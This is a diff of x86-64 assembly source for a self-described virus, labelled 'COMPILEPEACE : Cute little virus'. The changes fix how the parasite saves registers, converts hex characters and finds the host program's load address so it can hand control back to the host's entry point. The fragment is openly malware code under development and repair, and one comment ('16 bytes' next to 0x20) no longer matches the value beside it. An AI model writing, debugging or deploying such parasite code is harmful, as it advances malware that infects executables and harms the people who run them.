@@ -31,7 +31,7 @@ SYS_READ    equ 0x0         ; 0
 SYS_OPEN    equ 0x2         ; 2
 SYS_LSEEK   equ 0x8         ; 8
 SYS_EXECVE  equ 0x3b        ; 59
-ALLOC_SPACE equ 0x10		; 16 bytes
+ALLOC_SPACE equ 0x20		; 16 bytes
 
 O_RDONLY    equ 0x0         ; 0
 ;-x-x-x-x- CONSTANTS -x-x-x-x-;
@@ -44,11 +44,9 @@ _start:
 	push rax
 	push rcx
 	push rdx
-	push rsi
 	push rdi
 	push r11
-	push rbx
-
+	push r12
 	
 	jmp	parasite
 	message:	db	"-x-x-x-x- COMPILEPEACE : Cute little virus ^_^ -x-x-x-x-", 0xa
@@ -119,7 +117,7 @@ read_characters:
 
 alphabet_found:
     ; Character read is an alphabet [a-f], do the math to convert char(int) into equivalent hex
-    sub r8b, 0x61               ; R8 stores the extracted byte
+    sub r8b, 0x57               ; R8 stores the extracted byte (0x62('b') - 0x57 = 0xb)
     jmp load_into_rbx
 
 ; Convert the char byte (eg: 0x35 for '5') to its equivalent hex (eg: '5'(0x35) to 0x5)
@@ -153,14 +151,12 @@ done:
 
 address_loaded_in_RBX:
 	; Restoring register state
-	pop rbx
+	pop r12
 	pop r11
 	pop rdi
-	pop rsi
 	pop rdx
 	pop rcx
 	pop rax
-
 	
 	; RBX contains the base address (where the program is loaded in memory), adding the offset of
 	; entry point to it will give us the exact location the parasite has to resume afterexecution. 
